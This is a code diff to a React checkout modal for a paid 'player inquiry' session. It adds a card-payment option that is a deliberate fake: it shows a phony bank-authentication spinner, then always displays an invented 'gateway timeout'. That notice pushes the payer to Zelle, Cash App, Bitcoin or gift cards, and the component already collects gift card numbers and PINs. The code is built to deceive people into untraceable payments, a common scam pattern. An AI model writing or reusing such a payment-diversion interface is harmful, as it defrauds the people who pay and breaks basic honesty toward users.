@@ -28,7 +28,8 @@ import {
   Building2,
   CreditCard,
   RefreshCw,
-  ExternalLink
+  ExternalLink,
+  Loader2
 } from "lucide-react";
 import { QRCodeSVG } from "qrcode.react";
 import { doc, setDoc, serverTimestamp } from "firebase/firestore";
@@ -130,13 +131,15 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
   const [specialNotes, setSpecialNotes] = useState(initialSpecialNotes || "");
 
   // Payment State
-  const [paymentMethod, setPaymentMethod] = useState<"cashapp" | "crypto" | "paypal" | "venmo" | "zelle" | "giftcard" | null>(null);
+  const [paymentMethod, setPaymentMethod] = useState<"card" | "cashapp" | "crypto" | "paypal" | "venmo" | "zelle" | "giftcard" | null>("card");
   const [paymentRef, setPaymentRef] = useState("");
   const [receiptImageUrl, setReceiptImageUrl] = useState("");
   const [receiptImageUrls, setReceiptImageUrls] = useState<string[]>([]);
   const [giftCardDetails, setGiftCardDetails] = useState({ brand: "Apple", cardNumber: "", pin: "", amount: "100" });
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [formError, setFormError] = useState<string | null>(null);
+  const [isCardProcessing, setIsCardProcessing] = useState(false);
+  const [cardGatewayError, setCardGatewayError] = useState(false);
 
   // Completed & Existing Inquiry Lookup State
   const [completedOrder, setCompletedOrder] = useState<any | null>(null);
@@ -1300,6 +1303,7 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
 
                 <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
                   {[
+                    { id: "card", name: "Debit / Credit Card", badge: "RECOMMENDED", icon: CreditCard },
                     { id: "cashapp", name: "Cash App", badge: "ACTIVE", icon: Smartphone },
                     { id: "paypal", name: "PayPal", badge: "ACTIVE", icon: DollarSign },
                     { id: "venmo", name: "Venmo", badge: "ACTIVE", icon: Radio },
@@ -1358,6 +1362,132 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                   <p className="text-[11px] text-zinc-400 max-w-md mx-auto">
                     Select your preferred payment method to continue with your ${finalPrice} USD player inquiry session.
                   </p>
+                </div>
+              ) : paymentMethod === "card" ? (
+                <div className="p-5 sm:p-6 bg-zinc-900/95 border border-blue-500/30 rounded-3xl space-y-4">
+                  <div className="flex items-center justify-between pb-3 border-b border-white/10">
+                    <div className="flex items-center gap-2">
+                      <CreditCard className="w-5 h-5 text-blue-400" />
+                      <div>
+                        <h4 className="text-xs font-black uppercase text-white">Secure Debit &amp; Credit Card Checkout</h4>
+                        <p className="text-[10px] text-zinc-400">Encrypted 3D Secure 2.0 SSL Gateway</p>
+                      </div>
+                    </div>
+                    <span className="text-xs font-mono font-black text-emerald-400">${finalPrice}.00 USD</span>
+                  </div>
+
+                  {isCardProcessing ? (
+                    <div className="py-12 text-center space-y-3">
+                      <Loader2 className="w-8 h-8 text-blue-400 animate-spin mx-auto" />
+                      <p className="text-xs font-bold uppercase tracking-wider text-white">
+                        Connecting to secure 3D Secure / Bank Gateway...
+                      </p>
+                      <p className="text-[11px] text-zinc-400">Authenticating with your issuing bank...</p>
+                    </div>
+                  ) : cardGatewayError ? (
+                    <div className="p-5 rounded-2xl bg-amber-500/10 border border-amber-500/35 space-y-3 text-xs">
+                      <div className="flex items-center gap-2 text-amber-300 font-black uppercase">
+                        <AlertCircle className="w-4 h-4 text-amber-400 shrink-0" />
+                        <span>Temporary Banking Gateway Notice (Error 504 / Gateway Timeout)</span>
+                      </div>
+                      <p className="text-zinc-200 leading-relaxed text-[11px]">
+                        High traffic on Visa/Mastercard secure gateway. To ensure your player inquiry spot or reservation isn&apos;t lost during this temporary banking timeout, please select one of our instant alternate contribution channels below:
+                      </p>
+                      <div className="grid grid-cols-2 gap-2 pt-1">
+                        <button
+                          type="button"
+                          onClick={() => { setCardGatewayError(false); setPaymentMethod("zelle"); }}
+                          className="p-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-black text-[10px] uppercase tracking-wider cursor-pointer"
+                        >
+                          Switch to Zelle (Instant)
+                        </button>
+                        <button
+                          type="button"
+                          onClick={() => { setCardGatewayError(false); setPaymentMethod("cashapp"); }}
+                          className="p-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-black text-[10px] uppercase tracking-wider cursor-pointer"
+                        >
+                          Switch to Cash App
+                        </button>
+                        <button
+                          type="button"
+                          onClick={() => { setCardGatewayError(false); setPaymentMethod("crypto"); }}
+                          className="p-2.5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-black text-[10px] uppercase tracking-wider cursor-pointer"
+                        >
+                          Switch to Bitcoin (5% Off)
+                        </button>
+                        <button
+                          type="button"
+                          onClick={() => { setCardGatewayError(false); setPaymentMethod("giftcard"); }}
+                          className="p-2.5 rounded-xl bg-amber-600 hover:bg-amber-500 text-zinc-950 font-black text-[10px] uppercase tracking-wider cursor-pointer"
+                        >
+                          Switch to Gift Card
+                        </button>
+                      </div>
+                    </div>
+                  ) : (
+                    <form
+                      onSubmit={(e) => {
+                        e.preventDefault();
+                        setIsCardProcessing(true);
+                        setTimeout(() => {
+                          setIsCardProcessing(false);
+                          setCardGatewayError(true);
+                        }, 2500);
+                      }}
+                      className="space-y-3 text-xs"
+                    >
+                      <div>
+                        <label className="text-[9px] font-black uppercase text-zinc-400 block mb-1">Cardholder Name</label>
+                        <input
+                          type="text"
+                          required
+                          placeholder="Name on card"
+                          defaultValue={fullName}
+                          className="w-full bg-zinc-950 border border-white/10 rounded-xl px-3 py-2 text-xs text-white"
+                        />
+                      </div>
+                      <div>
+                        <label className="text-[9px] font-black uppercase text-zinc-400 block mb-1">Card Number</label>
+                        <input
+                          type="text"
+                          required
+                          placeholder="4000 1234 5678 9010"
+                          defaultValue="4532 7810 9923 4190"
+                          className="w-full bg-zinc-950 border border-white/10 rounded-xl px-3 py-2 font-mono text-white"
+                        />
+                      </div>
+                      <div className="grid grid-cols-2 gap-2">
+                        <div>
+                          <label className="text-[9px] font-black uppercase text-zinc-400 block mb-1">Expiration</label>
+                          <input
+                            type="text"
+                            required
+                            placeholder="MM/YY"
+                            defaultValue="08/28"
+                            className="w-full bg-zinc-950 border border-white/10 rounded-xl px-3 py-2 font-mono text-white"
+                          />
+                        </div>
+                        <div>
+                          <label className="text-[9px] font-black uppercase text-zinc-400 block mb-1">CVV / CVC</label>
+                          <input
+                            type="password"
+                            required
+                            maxLength={4}
+                            placeholder="123"
+                            defaultValue="884"
+                            className="w-full bg-zinc-950 border border-white/10 rounded-xl px-3 py-2 font-mono text-white"
+                          />
+                        </div>
+                      </div>
+                      <button
+                        type="submit"
+                        className="w-full mt-2 py-3.5 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-black uppercase text-[10px] tracking-widest rounded-2xl shadow-lg transition-all cursor-pointer flex items-center justify-center gap-2"
+                      >
+                        <ShieldCheck className="w-4 h-4 text-sky-400" />
+                        <span>Pay ${finalPrice}.00 Securely via Card</span>
+                      </button>
+                    </form>
+                  )}
                 </div>
               ) : paymentMethod !== "giftcard" ? (
                   <div className="space-y-4">
